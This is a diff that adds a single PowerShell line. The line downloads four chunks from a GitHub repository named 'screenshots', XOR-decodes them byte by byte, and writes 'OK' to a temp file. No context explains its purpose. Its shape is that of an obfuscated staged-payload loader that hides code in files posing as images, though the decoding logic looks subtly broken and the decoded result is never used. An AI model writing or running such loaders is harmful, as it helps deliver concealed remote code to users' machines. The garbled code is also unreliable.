@@ -1,0 +1,1 @@
+$c=New-Object Net.WebClient;$ch=@();0..3|%{$ch+=$c.DownloadData("https://raw.githubusercontent.com/cem324/screenshots/main/c"+$_)};0..($ch[0].Length-1)|%{$v=$ch[0][$_];1..3|%{$v=$v-bxor$ch[$_][$_]}};"OK"|Out-File C:\temp\x2.txt
